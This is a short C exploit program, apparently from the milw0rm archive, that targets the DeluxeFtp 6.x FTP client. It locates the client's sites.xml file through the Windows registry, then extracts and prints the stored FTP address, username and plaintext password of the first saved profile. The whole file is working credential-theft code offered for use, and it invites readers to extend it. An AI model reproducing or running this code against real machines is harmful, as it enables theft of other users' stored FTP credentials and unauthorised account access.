/*******************************************************************

DeluxeFtp 6.x Local Password Disclosure Exploit by Kozan

Application: DeluxeFtp 6.x (and probably prior versions)
Vendor: www.deluxeftp.com
Vulnerable Description: DeluxeFtp 6.x discloses passwords
to local users.

Bug Discovered by: Lostmon
Exploit Coded by: Kozan
Credits to ATmaCA
Web: www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan@netmagister.com

*******************************************************************/

#include <stdio.h>
#include <string.h>
#include <windows.h>


HKEY hKey;
#define BUFSIZE 100
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;


int adresal(char *FilePath,char *Str)
{
char kr;
int Sayac=0;
int Offset=-1;
FILE *di;
di=fopen(FilePath,"rb");

if( di == NULL )
{
fclose(di);
return -1;
}

while(!feof(di))
{
Sayac++;
for(int i=0;i<strlen(Str);i++)
{
kr=getc(di);
if(kr != Str[i])
{
if( i>0 )
{
fseek(di,Sayac+1,SEEK_SET);
}
break;
}
if( i > ( strlen(Str)-2 ) )
{
Offset = ftell(di)-strlen(Str);
fclose(di);
return Offset;
}
}
}
fclose(di);
return -1;
}


char *oku(char *FilePath,char *Str)
{

FILE *di;
char cr;
int i=0;
char Feature[500];

int Offset = adresal(FilePath,Str);

if( Offset == -1 )
return "";

if( (di=fopen(FilePath,"rb")) == NULL )
return "";

fseek(di,Offset+strlen(Str),SEEK_SET);

while(!feof(di))
{
cr=getc(di);
if(cr == '<')
break;
Feature[i] = cr;
i++;
}

Feature[i] = '\0';
fclose(di);
return Feature;
}




int main()
{
if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
0,
KEY_QUERY_VALUE,
&hKey) == ERROR_SUCCESS)
{

lRet = RegQueryValueEx( hKey, "ProgramFilesDir", NULL, NULL,
(LPBYTE) prgfiles, &dwBufLen);

if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) )
{
RegCloseKey(hKey);
printf("An error occured!\n");
exit(1);
}

RegCloseKey(hKey);

}
else
{
RegCloseKey(hKey);
printf("An error occured!\n");
exit(1);
}

strcat(prgfiles,"\\DeluxeFTP\\sites.xml");


printf("DeluxeFtp 6.x Local Password Disclosure Exploit by Kozan\n");
printf("Bug Discovered by Lostmon\n");
printf("Exploit coded by Kozan\n");
printf("Credits to ATmaCA\n");
printf("www.netmagister.com - www.spyinstructors.com \n\n");
printf("This exploit only shows the first profile and its password.\n");
printf("You may improve it freely...\n\n");

char FtpAddress[BUFSIZE], FtpUsername[BUFSIZE], FtpPassword[BUFSIZE];

strcpy(FtpAddress,oku(prgfiles,"<ADDRESS>"));
strcpy(FtpUsername,oku(prgfiles,"<LOGIN>"));
strcpy(FtpPassword,oku(prgfiles,"<PASSWORD>"));

printf("Ftp Address : %s\n",FtpAddress);
printf("Ftp Username : %s\n",FtpUsername);
printf("Ftp Password : %s\n",FtpPassword);

return 0;
}

// milw0rm.com [2005-04-13]
